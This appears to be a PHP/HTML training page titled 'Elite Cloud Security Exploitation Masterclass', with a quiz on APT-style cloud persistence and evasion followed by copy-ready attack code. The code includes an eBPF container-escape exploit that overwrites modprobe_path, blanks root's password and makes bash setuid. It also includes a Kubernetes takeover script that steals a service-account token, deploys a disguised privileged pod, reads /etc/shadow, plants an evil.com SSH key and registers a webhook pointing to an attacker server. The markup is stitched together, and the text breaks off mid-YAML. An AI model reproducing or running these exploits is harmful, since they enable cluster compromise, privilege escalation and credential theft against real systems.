<?php
// Elite Cloud Security Exploitation Masterclass
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = 1;
    $_SESSION['username'] = 'EliteOperator';
}

$user_id = $_SESSION['user_id'];
$username = $_SESSION['username'];
$tutorial_id = 'elite-cloud-security-exploitation';
$tutorial_completed = false;

// Elite-level quiz questions covering sophisticated nation-state techniques
$quiz_questions = [
    [
        'id' => 'q1',
        'question' => 'In a sophisticated supply chain attack targeting Kubernetes environments, which technique allows for persistent cluster-wide compromise through poisoned container images?',
        'options' => [
            'Injecting malicious init containers with hostPID access',
            'Modifying base images in shared container registries with backdoored systemd services',
            'Exploiting admission controller webhooks to inject sidecar containers',
            'Using mutating webhook configurations to modify all pod specifications'
        ],
        'correct' => 1,
        'explanation' => 'Poisoning base images in shared registries with backdoored systemd services creates persistent access across all deployments using those images, surviving pod restarts and cluster updates - a technique used by APT groups like Lazarus.'
    ],
    [
        'id' => 'q2',
        'question' => 'What is the most sophisticated method for achieving cross-cloud provider persistence that survives infrastructure-as-code redeployments?',
        'options' => [
            'Backdooring Terraform state files in remote backends',
            'Injecting malicious modules into private Terraform registries',
            'Modifying CloudFormation nested stack templates',
            'Compromising CI/CD pipeline service accounts across multiple clouds'
        ],
        'correct' => 1,
        'explanation' => 'Injecting malicious modules into private Terraform registries ensures that every infrastructure deployment includes backdoors, creating persistent access that survives complete infrastructure rebuilds - a technique observed in advanced supply chain attacks.'
    ],
    [
        'id' => 'q3',
        'question' => 'Which advanced technique bypasses both AWS CloudTrail and VPC Flow Logs while maintaining C2 communication from compromised instances?',
        'options' => [
            'DNS tunneling through Route 53 resolver queries',
            'Steganographic communication through S3 object metadata',
            'HTTP/3 QUIC communication through CloudFront edge locations',
            'Covert channels through EBS volume encryption key rotation events'
        ],
        'correct' => 3,
        'explanation' => 'Using EBS encryption key rotation events as a covert channel bypasses traditional logging by embedding data in cryptographic operations, making detection extremely difficult as it appears as legitimate encryption activity.'
    ],
    [
        'id' => 'q4',
        'question' => 'In advanced Azure AD privilege escalation, which technique allows for persistent Global Administrator access without triggering Privileged Identity Management alerts?',
        'options' => [
            'Creating shadow Global Admin through group membership manipulation',
            'Exploiting OAuth application permissions with offline_access scope',
            'Backdooring custom RBAC roles with wildcard permissions',
            'Injecting malicious authentication methods into existing admin accounts'
        ],
        'correct' => 3,
        'explanation' => 'Injecting malicious authentication methods (like FIDO2 keys or certificate-based auth) into existing admin accounts creates persistent access without creating new privileged accounts that would trigger monitoring alerts.'
    ],
    [
        'id' => 'q5',
        'question' => 'What is the most advanced technique for exfiltrating data from air-gapped GCP environments using only legitimate cloud services?',
        'options' => [
            'Modulating Cloud Function execution times to encode data',
            'Using BigQuery job statistics as a covert channel',
            'Encoding data in Cloud Storage bucket lifecycle policies',
            'Steganographic embedding in Cloud Vision API training data'
        ],
        'correct' => 0,
        'explanation' => 'Modulating Cloud Function execution times creates a timing-based covert channel that can exfiltrate data through observable performance metrics, bypassing traditional DLP and network monitoring in air-gapped environments.'
    ],
    [
        'id' => 'q6',
        'question' => 'Which zero-day class exploitation technique targets serverless function cold starts to achieve persistent code execution?',
        'options' => [
            'Runtime environment poisoning through shared lambda layers',
            'Exploiting container image layering to inject persistent rootkits',
            'Memory corruption in language runtime initialization',
            'Dependency confusion attacks targeting function package managers'
        ],
        'correct' => 0,
        'explanation' => 'Runtime environment poisoning through shared Lambda layers allows persistent code injection that survives function redeployments, as the malicious code is embedded in shared runtime components used across multiple functions.'
    ],
    [
        'id' => 'q7',
        'question' => 'In advanced container escape scenarios, which technique provides the highest probability of success against modern hardened Kubernetes environments?',
        'options' => [
            'Exploiting kernel vulnerabilities through privileged containers',
            'Abusing shared Unix domain sockets between containers and host',
            'Leveraging eBPF program injection for privilege escalation',
            'Exploiting race conditions in cgroup v2 namespace transitions'
        ],
        'correct' => 2,
        'explanation' => 'eBPF program injection allows arbitrary kernel code execution with minimal detection, bypassing most container security measures and providing direct access to host kernel functionality - a technique used in advanced APT campaigns.'
    ],
    [
        'id' => 'q8',
        'question' => 'What is the most sophisticated technique for maintaining persistence in immutable infrastructure environments?',
        'options' => [
            'Backdooring infrastructure automation Git repositories',
            'Injecting malicious AMI snapshots into automated scaling groups',
            'Exploiting infrastructure drift detection to hide persistent changes',
            'Poisoning infrastructure dependency chains through typosquatting'
        ],
        'correct' => 2,
        'explanation' => 'Exploiting infrastructure drift detection mechanisms allows attackers to hide persistent changes by manipulating the tools designed to detect unauthorized modifications, making malicious infrastructure appear legitimate.'
    ],
    [
        'id' => 'q9',
        'question' => 'Which advanced technique allows for persistent credential harvesting across multiple cloud tenants in enterprise environments?',
        'options' => [
            'Cross-tenant resource sharing exploitation',
            'Poisoning shared identity provider SAML assertions',
            'Backdooring enterprise application galleries',
            'Exploiting conditional access policy loopholes'
        ],
        'correct' => 1,
        'explanation' => 'Poisoning shared identity provider SAML assertions allows credential harvesting across all connected cloud tenants, providing enterprise-wide access through a single compromise point - a technique seen in sophisticated nation-state attacks.'
    ],
    [
        'id' => 'q10',
        'question' => 'What is the most advanced technique for achieving persistent access to cloud-native applications without touching the underlying infrastructure?',
        'options' => [
            'Backdooring microservice mesh sidecar proxies',
            'Injecting malicious code into service mesh control planes',
            'Exploiting service-to-service authentication weaknesses',
            'Poisoning container image vulnerability scanners'
        ],
        'correct' => 1,
        'explanation' => 'Injecting malicious code into service mesh control planes (like Istio) provides persistent access to all microservices in the mesh while appearing as legitimate service mesh functionality, making detection extremely difficult.'
    ],
    [
        'id' => 'q11',
        'question' => 'Which cutting-edge technique exploits AI/ML model inference endpoints for persistent command and control?',
        'options' => [
            'Adversarial input encoding for steganographic communication',
            'Model weight modification for backdoor activation',
            'Training data poisoning for persistent model compromise',
            'Inference API abuse for covert channel establishment'
        ],
        'correct' => 0,
        'explanation' => 'Adversarial input encoding allows steganographic communication through ML model inputs/outputs, creating a covert channel that appears as legitimate AI/ML traffic and bypasses traditional network monitoring.'
    ],
    [
        'id' => 'q12',
        'question' => 'What is the most sophisticated method for achieving cross-cloud lateral movement without traditional network connectivity?',
        'options' => [
            'Exploiting shared managed services for data exfiltration',
            'Using DNS as a universal communication protocol',
            'Leveraging cloud marketplace applications for pivot points',
            'Abusing cloud billing systems for covert communication'
        ],
        'correct' => 2,
        'explanation' => 'Leveraging cloud marketplace applications as pivot points allows cross-cloud movement through legitimate business relationships, bypassing network isolation and appearing as normal business operations.'
    ]
];

// Randomize questions
if (!isset($_SESSION['quiz_order_' . $tutorial_id])) {
    $_SESSION['quiz_order_' . $tutorial_id] = range(0, count($quiz_questions) - 1);
    shuffle($_SESSION['quiz_order_' . $tutorial_id]);
}

$randomized_questions = [];
foreach ($_SESSION['quiz_order_' . $tutorial_id] as $index) {
    $randomized_questions[] = $quiz_questions[$index];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Cloud Security Exploitation Masterclass</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css" rel="stylesheet">
    <style>
        :root {
            --elite-gradient: linear-gradient(135deg, #000000 0%, #434343 100%);
            --danger-gradient: linear-gradient(135deg, #ff0000 0%, #8b0000 100%);
            --success-gradient: linear-gradient(135deg, #00ff00 0%, #006400 100%);
            --warning-gradient: linear-gradient(135deg, #ffff00 0%, #ff8c00 100%);
            --neon-blue: #00ffff;
            --neon-green: #39ff14;
            --neon-red: #ff073a;
            --neon-purple: #bf00ff;
            --dark-bg: #000000;
            --card-bg: #0a0a0a;
            --terminal-bg: #000000;
            --text-primary: #00ff00;
            --text-secondary: #00ffff;
            --border-neon: rgba(0, 255, 255, 0.3);
        }

        * { box-sizing: border-box; }

        body {
            background: var(--dark-bg);
            color: var(--text-primary);
            font-family: 'Courier New', 'Monaco', monospace;
            line-height: 1.4;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        .terminal-hero {
            background: linear-gradient(135deg, #000000 0%, #1a0000 50%, #000000 100%);
            color: var(--neon-green);
            padding: 4rem 0;
            position: relative;
            border-bottom: 2px solid var(--neon-red);
        }

        .terminal-hero::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0, 255, 0, 0.03) 2px,
                rgba(0, 255, 0, 0.03) 4px
            );
            pointer-events: none;
        }

        .hero-content {
            position: relative;
            z-index: 2;
        }

        .classification-banner {
            background: var(--danger-gradient);
            color: white;
            padding: 0.5rem;
            text-align: center;
            font-weight: bold;
            letter-spacing: 2px;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 9999;
            border-bottom: 2px solid #ff073a;
        }

        .elite-card {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            border: 2px solid var(--border-neon);
            border-radius: 0;
            padding: 3rem;
            margin: 3rem 0;
            position: relative;
            box-shadow: 
                0 0 20px rgba(0, 255, 255, 0.1),
                inset 0 0 20px rgba(0, 255, 255, 0.05);
        }

        .elite-card::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-green), var(--neon-red), var(--neon-purple));
            z-index: -1;
            border-radius: 0;
            animation: borderGlow 3s linear infinite;
        }

        @keyframes borderGlow {
            0% { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }

        .section-header {
            display: flex;
            align-items: center;
            gap: 2rem;
            margin-bottom: 3rem;
            padding: 2rem;
            background: var(--terminal-bg);
            border: 1px solid var(--neon-green);
        }

        .section-number {
            width: 80px;
            height: 80px;
            background: var(--elite-gradient);
            border: 2px solid var(--neon-green);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            font-weight: bold;
            color: var(--neon-green);
            text-shadow: 0 0 10px var(--neon-green);
        }

        .terminal-section {
            background: var(--terminal-bg);
            border: 2px solid var(--neon-green);
            margin: 2rem 0;
            position: relative;
        }

        .terminal-header {
            background: var(--neon-green);
            color: var(--dark-bg);
            padding: 0.5rem 1rem;
            font-weight: bold;
            display: flex;
            justify-content: between;
            align-items: center;
        }

        .terminal-body {
            padding: 2rem;
            color: var(--neon-green);
            font-family: 'Courier New', monospace;
        }

        .code-terminal {
            background: #000000;
            border: 2px solid var(--neon-green);
            padding: 2rem;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            margin: 2rem 0;
            overflow-x: auto;
            position: relative;
            box-shadow: 
                0 0 20px rgba(0, 255, 0, 0.2),
                inset 0 0 20px rgba(0, 255, 0, 0.1);
        }

        .terminal-prompt { color: var(--neon-red); }
        .terminal-success { color: var(--neon-green); }
        .terminal-warning { color: var(--warning-gradient); }
        .terminal-error { color: var(--neon-red); }
        .terminal-info { color: var(--neon-blue); }

        .elite-lab {
            background: linear-gradient(135deg, #000000 0%, #1a0000 50%, #000000 100%);
            border: 3px solid var(--neon-red);
            padding: 3rem;
            margin: 4rem 0;
            position: relative;
            box-shadow: 
                0 0 30px rgba(255, 7, 58, 0.3),
                inset 0 0 30px rgba(255, 7, 58, 0.1);
        }

        .lab-title {
            background: var(--danger-gradient);
            color: white;
            padding: 1rem 2rem;
            font-weight: bold;
            font-size: 1.5rem;
            text-align: center;
            margin-bottom: 2rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            border: 2px solid var(--neon-red);
        }

        .attack-scenario {
            background: rgba(255, 0, 0, 0.1);
            border: 2px solid var(--neon-red);
            padding: 2rem;
            margin: 2rem 0;
            border-left: 5px solid var(--neon-red);
        }

        .exploit-interface {
            background: #000000;
            border: 2px solid var(--neon-blue);
            padding: 2rem;
            margin: 2rem 0;
            font-family: 'Courier New', monospace;
        }

        .exploit-console {
            background: #000000;
            border: 1px solid var(--neon-green);
            padding: 1.5rem;
            margin: 1rem 0;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
        }

        .elite-btn {
            background: linear-gradient(135deg, #000000 0%, #434343 100%);
            color: var(--neon-green);
            border: 2px solid var(--neon-green);
            padding: 1rem 2rem;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            margin: 0.5rem;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .elite-btn:hover {
            background: var(--neon-green);
            color: var(--dark-bg);
            box-shadow: 0 0 20px var(--neon-green);
            text-shadow: none;
        }

        .danger-btn {
            border-color: var(--neon-red);
            color: var(--neon-red);
        }

        .danger-btn:hover {
            background: var(--neon-red);
            color: white;
            box-shadow: 0 0 20px var(--neon-red);
        }

        .technique-matrix {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 2rem;
            margin: 3rem 0;
        }

        .technique-card {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            border: 2px solid var(--neon-purple);
            padding: 2rem;
            position: relative;
            transition: all 0.3s ease;
        }

        .technique-card:hover {
            border-color: var(--neon-red);
            box-shadow: 0 0 30px rgba(255, 7, 58, 0.3);
        }

        .severity-critical {
            border-left: 5px solid var(--neon-red);
            background: linear-gradient(135deg, rgba(255, 0, 0, 0.1) 0%, rgba(139, 0, 0, 0.1) 100%);
        }

        .severity-advanced {
            border-left: 5px solid var(--neon-purple);
            background: linear-gradient(135deg, rgba(191, 0, 255, 0.1) 0%, rgba(75, 0, 130, 0.1) 100%);
        }

        .severity-expert {
            border-left: 5px solid var(--neon-blue);
            background: linear-gradient(135deg, rgba(0, 255, 255, 0.1) 0%, rgba(0, 0, 139, 0.1) 100%);
        }

        .quiz-terminal {
            background: var(--terminal-bg);
            border: 3px solid var(--neon-red);
            padding: 4rem;
            margin: 4rem 0;
            position: relative;
        }

        .quiz-question {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            border: 2px solid var(--border-neon);
            padding: 3rem;
            margin: 3rem 0;
        }

        .question-header {
            display: flex;
            align-items: flex-start;
            gap: 2rem;
            margin-bottom: 2rem;
        }

        .question-number {
            background: var(--danger-gradient);
            color: white;
            width: 50px;
            height: 50px;
            border: 2px solid var(--neon-red);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            flex-shrink: 0;
            text-shadow: 0 0 10px var(--neon-red);
        }

        .question-text {
            font-size: 1.2rem;
            font-weight: bold;
            line-height: 1.4;
            color: var(--text-primary);
        }

        .option {
            background: var(--terminal-bg);
            border: 2px solid var(--border-neon);
            padding: 1.5rem 2rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 1.5rem;
            margin-bottom: 1rem;
            font-family: 'Courier New', monospace;
        }

        .option:hover {
            border-color: var(--neon-green);
            background: rgba(0, 255, 0, 0.1);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }

        .option.selected {
            border-color: var(--neon-blue);
            background: rgba(0, 255, 255, 0.1);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
        }

        .option.correct {
            border-color: var(--neon-green);
            background: rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        .option.incorrect {
            border-color: var(--neon-red);
            background: rgba(255, 0, 0, 0.2);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
        }

        .option-letter {
            background: var(--neon-blue);
            color: var(--dark-bg);
            width: 40px;
            height: 40px;
            border: 2px solid var(--neon-blue);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            flex-shrink: 0;
        }

        .explanation {
            background: linear-gradient(135deg, rgba(0, 255, 255, 0.1) 0%, rgba(0, 0, 139, 0.1) 100%);
            border: 2px solid var(--neon-blue);
            padding: 2rem;
            margin-top: 2rem;
            display: none;
        }

        .explanation.show {
            display: block;
            animation: glitchIn 0.5s ease;
        }

        @keyframes glitchIn {
            0% { transform: translateX(-5px); opacity: 0; }
            20% { transform: translateX(5px); }
            40% { transform: translateX(-3px); }
            60% { transform: translateX(3px); }
            80% { transform: translateX(-1px); }
            100% { transform: translateX(0); opacity: 1; }
        }

        .progress-matrix {
            display: grid;
            grid-template-columns: repeat(12, 1fr);
            gap: 0.5rem;
            margin: 2rem 0;
            padding: 1rem;
            background: var(--terminal-bg);
            border: 2px solid var(--neon-green);
        }

        .progress-cell {
            width: 30px;
            height: 30px;
            background: var(--terminal-bg);
            border: 1px solid var(--border-neon);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            font-weight: bold;
        }

        .progress-cell.completed {
            background: var(--neon-green);
            color: var(--dark-bg);
            box-shadow: 0 0 10px var(--neon-green);
        }

        .progress-cell.current {
            background: var(--neon-red);
            color: white;
            box-shadow: 0 0 10px var(--neon-red);
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .elite-warning {
            background: linear-gradient(135deg, rgba(255, 0, 0, 0.2) 0%, rgba(139, 0, 0, 0.2) 100%);
            border: 3px solid var(--neon-red);
            padding: 2rem;
            margin: 2rem 0;
            text-align: center;
            font-weight: bold;
            color: var(--neon-red);
            text-transform: uppercase;
            letter-spacing: 2px;
            animation: warningFlash 2s infinite;
        }

        @keyframes warningFlash {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .attack-chain {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 2rem 0;
            padding: 1rem;
            background: var(--terminal-bg);
            border: 2px solid var(--neon-purple);
        }

        .chain-step {
            background: var(--elite-gradient);
            border: 2px solid var(--neon-blue);
            padding: 1rem;
            text-align: center;
            min-width: 150px;
            color: var(--neon-blue);
            font-weight: bold;
        }

        .chain-arrow {
            color: var(--neon-red);
            font-size: 2rem;
            font-weight: bold;
        }

        @media (max-width: 768px) {
            .terminal-hero { padding: 2rem 0; }
            .section-header { flex-direction: column; text-align: center; }
            .technique-matrix { grid-template-columns: 1fr; }
            .attack-chain { flex-direction: column; gap: 1rem; }
            .chain-arrow { transform: rotate(90deg); }
        }

        .scrollbar::-webkit-scrollbar {
            width: 8px;
        }

        .scrollbar::-webkit-scrollbar-track {
            background: var(--terminal-bg);
        }

        .scrollbar::-webkit-scrollbar-thumb {
            background: var(--neon-green);
            border-radius: 4px;
        }

        .glitch-text {
            animation: glitch 2s infinite;
        }

        @keyframes glitch {
            0%, 100% { text-shadow: 0.05em 0 0 var(--neon-red), -0.05em -0.025em 0 var(--neon-blue), 0.025em 0.05em 0 var(--neon-green); }
            15% { text-shadow: 0.05em 0 0 var(--neon-red), -0.05em -0.025em 0 var(--neon-blue), 0.025em 0.05em 0 var(--neon-green); }
            16% { text-shadow: -0.05em -0.025em 0 var(--neon-red), 0.025em 0.025em 0 var(--neon-blue), -0.05em -0.05em 0 var(--neon-green); }
            49% { text-shadow: -0.05em -0.025em 0 var(--neon-red), 0.025em 0.025em 0 var(--neon-blue), -0.05em -0.05em 0 var(--neon-green); }
            50% { text-shadow: 0.025em 0.05em 0 var(--neon-red), 0.05em 0 0 var(--neon-blue), 0 -0.05em 0 var(--neon-green); }
            99% { text-shadow: 0.025em 0.05em 0 var(--neon-red), 0.05em 0 0 var(--neon-blue), 0 -0.05em 0 var(--neon-green); }
        }
    </style>
</head>
<body>
    <div class="classification-banner">
        ⚠️ CLASSIFIED - FOR AUTHORIZED PERSONNEL ONLY - ELITE EXPLOITATION TECHNIQUES ⚠️
    </div>

    <div class="terminal-hero" style="margin-top: 50px;">
        <div class="container">
            <div class="hero-content">
                <div class="row">
                    <div class="col-lg-8">
                        <h1 class="display-2 fw-bold mb-4 glitch-text">
                            ELITE CLOUD SECURITY EXPLOITATION
                        </h1>
                        <h2 class="mb-4" style="color: var(--neon-red);">
                            NATION-STATE & APT TECHNIQUES MASTERCLASS
                        </h2>
                        <p class="lead mb-4" style="color: var(--text-secondary);">
                            Master the most sophisticated cloud exploitation techniques used by advanced persistent threat groups, 
                            nation-state actors, and elite red teams. This course covers zero-day exploitation methods, 
                            advanced evasion techniques, and cutting-edge attack chains.
                        </p>
                        <div class="elite-warning">
                            EXTREME CAUTION: This content contains active exploitation techniques used in real-world attacks. 
                            Use only in authorized penetration testing environments. Unauthorized use may violate federal laws.
                        </div>

        <!-- Step 4: Advanced Container & Kubernetes Exploitation -->
        <div class="step-card">
            <div class="step-header">
                <div class="step-number">4</div>
                <div>
                    <h2>Advanced Container & Kubernetes Exploitation</h2>
                    <p>Sophisticated container escape and Kubernetes cluster compromise techniques</p>
                </div>
            </div>

            <div class="red-team-box section-box">
                <div class="section-title">
                    <i class="fas fa-cube"></i> Advanced Container Escape Techniques
                </div>
                
                <div class="vulnerability-grid">
                    <div class="vuln-card severity-critical">
                        <h5><i class="fas fa-terminal"></i> Kernel Exploitation via eBPF</h5>
                        <p>Advanced container escape using eBPF program injection and kernel vulnerabilities</p>
                        <div class="code-block">
                            <div class="code-header">
                                eBPF Container Escape Exploit
                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                            </div>
<span class="terminal-line"># Advanced eBPF-based container escape</span>
<span class="config-line">#!/bin/bash</span>
<span class="comment-line"># Exploit CVE-2022-23222 for container escape</span>

<span class="config-line">cat > ebpf_escape.c << 'EOF'</span>
<span class="config-line">#include &lt;linux/bpf.h&gt;</span>
<span class="config-line">#include &lt;linux/filter.h&gt;</span>
<span class="config-line">#include &lt;sys/syscall.h&gt;</span>
<span class="config-line">#include &lt;unistd.h&gt;</span>
<span class="config-line">#include &lt;stdint.h&gt;</span>

<span class="comment-line">// eBPF verifier bypass exploit</span>
<span class="config-line">static struct bpf_insn prog[] = {</span>
<span class="config-line">    BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),</span>
<span class="config-line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_10),</span>
<span class="config-line">    </span>
<span class="comment-line">    // Integer overflow in verifier bounds checking</span>
<span class="config-line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, -8),</span>
<span class="config-line">    BPF_MOV64_IMM(BPF_REG_0, 0),</span>
<span class="config-line">    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),</span>
<span class="config-line">    </span>
<span class="comment-line">    // Trigger kernel write primitive</span>
<span class="config-line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),</span>
<span class="config-line">    BPF_MOV64_IMM(BPF_REG_3, 8),</span>
<span class="config-line">    BPF_MOV64_IMM(BPF_REG_4, 0),</span>
<span class="config-line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_probe_read),</span>
<span class="config-line">    </span>
<span class="comment-line">    // Overwrite modprobe_path for arbitrary command execution</span>
<span class="config-line">    BPF_LD_IMM64(BPF_REG_1, 0xffffffff81e304c0), // modprobe_path address</span>
<span class="config-line">    BPF_LD_IMM64(BPF_REG_0, 0x706d742f706d742f), // "/tmp/tmp"</span>
<span class="config-line">    BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0),</span>
<span class="config-line">    </span>
<span class="config-line">    BPF_MOV64_IMM(BPF_REG_0, 0),</span>
<span class="config-line">    BPF_EXIT_INSN(),</span>
<span class="config-line">};</span>

<span class="config-line">int main() {</span>
<span class="config-line">    union bpf_attr attr = {</span>
<span class="config-line">        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span>
<span class="config-line">        .insns = (uint64_t)prog,</span>
<span class="config-line">        .insn_cnt = sizeof(prog) / sizeof(prog[0]),</span>
<span class="config-line">        .license = (uint64_t)"GPL",</span>
<span class="config-line">    };</span>
<span class="config-line">    </span>
<span class="comment-line">    // Load malicious eBPF program</span>
<span class="config-line">    int fd = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));</span>
<span class="config-line">    if (fd < 0) {</span>
<span class="config-line">        perror("BPF_PROG_LOAD failed");</span>
<span class="config-line">        return 1;</span>
<span class="config-line">    }</span>
<span class="config-line">    </span>
<span class="comment-line">    // Trigger kernel vulnerability</span>
<span class="config-line">    char trigger_data[16] = {0};</span>
<span class="config-line">    syscall(SYS_write, fd, trigger_data, sizeof(trigger_data));</span>
<span class="config-line">    </span>
<span class="config-line">    printf("[+] eBPF exploit executed successfully\n");</span>
<span class="config-line">    printf("[+] modprobe_path overwritten for arbitrary execution\n");</span>
<span class="config-line">    </span>
<span class="config-line">    return 0;</span>
<span class="config-line">}</span>
<span class="config-line">EOF</span>

<span class="terminal-line"># Compile and execute exploit</span>
<span class="config-line">gcc -static -o ebpf_escape ebpf_escape.c</span>
<span class="config-line">./ebpf_escape</span>

<span class="terminal-line"># Create malicious modprobe script for root shell</span>
<span class="config-line">cat > /tmp/modprobe_exploit << 'EOF'</span>
<span class="config-line">#!/bin/bash</span>
<span class="config-line">echo "root:x:0:0:root:/root:/bin/bash" >> /etc/passwd</span>
<span class="config-line">echo "root:" >> /etc/shadow</span>
<span class="config-line">chmod 4755 /bin/bash</span>
<span class="config-line">EOF</span>

<span class="config-line">chmod +x /tmp/modprobe_exploit</span>

<span class="terminal-line"># Trigger modprobe execution for privilege escalation</span>
<span class="config-line">echo -ne '\xff\xff\xff\xff' > /tmp/trigger_file</span>
<span class="config-line">chmod +x /tmp/trigger_file</span>
<span class="config-line">/tmp/trigger_file</span>

<span class="terminal-line"># Verify container escape and host access</span>
<span class="config-line">ls -la /proc/1/root/</span>
<span class="config-line">cat /proc/1/root/etc/shadow</span>
                        </div>
                    </div>

                    <div class="vuln-card severity-critical">
                        <h5><i class="fas fa-cogs"></i> Kubernetes Service Account Impersonation</h5>
                        <p>Advanced techniques for Kubernetes cluster compromise through service account abuse</p>
                        <div class="code-block">
                            <div class="code-header">
                                Kubernetes Cluster Takeover
                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                            </div>
<span class="terminal-line"># Advanced Kubernetes cluster compromise</span>
<span class="config-line">#!/bin/bash</span>
<span class="comment-line"># Multi-stage Kubernetes privilege escalation</span>

<span class="terminal-line"># Stage 1: Extract service account token</span>
<span class="config-line">SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</span>
<span class="config-line">NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)</span>
<span class="config-line">APISERVER=https://kubernetes.default.svc</span>

<span class="terminal-line"># Stage 2: Enumerate cluster permissions</span>
<span class="config-line">curl -sSk -H "Authorization: Bearer $SA_TOKEN" \</span>
<span class="config-line">    $APISERVER/api/v1/namespaces/$NAMESPACE/pods \</span>
<span class="config-line">    | jq '.items[].spec.serviceAccountName' | sort -u</span>

<span class="terminal-line"># Stage 3: Create malicious pod with elevated privileges</span>
<span class="config-line">cat > malicious-pod.yaml << 'EOF'</span>
<span class="config-line">apiVersion: v1</span>
<span class="config-line">kind: Pod</span>
<span class="config-line">metadata:</span>
<span class="config-line">  name: system-diagnostic-pod</span>
<span class="config-line">  namespace: kube-system</span>
<span class="config-line">spec:</span>
<span class="config-line">  serviceAccountName: default</span>
<span class="config-line">  hostNetwork: true</span>
<span class="config-line">  hostPID: true</span>
<span class="config-line">  hostIPC: true</span>
<span class="config-line">  containers:</span>
<span class="config-line">  - name: diagnostic</span>
<span class="config-line">    image: alpine:latest</span>
<span class="config-line">    command: ["/bin/sh"]</span>
<span class="config-line">    args: ["-c", "while true; do sleep 3600; done"]</span>
<span class="config-line">    securityContext:</span>
<span class="config-line">      privileged: true</span>
<span class="config-line">      runAsUser: 0</span>
<span class="config-line">    volumeMounts:</span>
<span class="config-line">    - name: host-root</span>
<span class="config-line">      mountPath: /host</span>
<span class="config-line">    - name: docker-socket</span>
<span class="config-line">      mountPath: /var/run/docker.sock</span>
<span class="config-line">  volumes:</span>
<span class="config-line">  - name: host-root</span>
<span class="config-line">    hostPath:</span>
<span class="config-line">      path: /</span>
<span class="config-line">  - name: docker-socket</span>
<span class="config-line">    hostPath:</span>
<span class="config-line">      path: /var/run/docker.sock</span>
<span class="config-line">EOF</span>

<span class="terminal-line"># Stage 4: Deploy malicious pod</span>
<span class="config-line">curl -sSk -X POST \</span>
<span class="config-line">    -H "Authorization: Bearer $SA_TOKEN" \</span>
<span class="config-line">    -H "Content-Type: application/yaml" \</span>
<span class="config-line">    --data-binary @malicious-pod.yaml \</span>
<span class="config-line">    "$APISERVER/api/v1/namespaces/kube-system/pods"</span>

<span class="terminal-line"># Stage 5: Execute commands on compromised node</span>
<span class="config-line">kubectl exec -n kube-system system-diagnostic-pod -- \</span>
<span class="config-line">    chroot /host /bin/bash -c "cat /etc/shadow"</span>

<span class="terminal-line"># Stage 6: Install persistent backdoor</span>
<span class="config-line">kubectl exec -n kube-system system-diagnostic-pod -- \</span>
<span class="config-line">    chroot /host /bin/bash -c "echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com' >> /root/.ssh/authorized_keys"</span>

<span class="terminal-line"># Stage 7: Create malicious admission controller webhook</span>
<span class="config-line">cat > webhook-backdoor.yaml << 'EOF'</span>
<span class="config-line">apiVersion: admissionregistration.k8s.io/v1</span>
<span class="config-line">kind: MutatingAdmissionWebhook</span>
<span class="config-line">metadata:</span>
<span class="config-line">  name: security-scanner</span>
<span class="config-line">webhooks:</span>
<span class="config-line">- name: security-scan.company.com</span>
<span class="config-line">  clientConfig:</span>
<span class="config-line">    url: "https://attacker-controlled-server.com/webhook"</span>
<span class="config-line">  rules:</span>
